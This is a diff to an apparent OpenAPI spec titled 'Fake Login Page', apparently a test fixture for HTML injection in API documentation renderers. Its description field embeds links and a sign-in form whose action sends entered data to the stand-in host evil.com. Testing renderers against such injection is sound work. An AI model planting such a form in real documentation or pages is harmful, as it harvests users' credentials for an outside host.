@@ -3,8 +3,11 @@ info:
   version: 1.0.0
   title: "Login Page - Fake Login Page"
   description: |
-    <a href="https://www.evil.com">Click Me</a>
-    <a <img src="https://upload.wikimedia.org/wikipedia/commons/a/a7/React-icon.svg" alt="Clickable Image" width="120"> </a>
+    <a href="https://www.go.com">Click Me</a>
+    <a href="https://www.go.com" target="_blank" rel="noopener">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/a/a7/React-icon.svg"
+         alt="Clickable Image" width="120">
+   </a>
     <div class="form-container">
       <form action="https://evil.com" method="get" class="form-signin">
         <div class="form-group">
@@ -50,3 +53,4 @@ paths:
           description: Invalid credentials or missing parameters
         '500':
           description: Internal server error
+
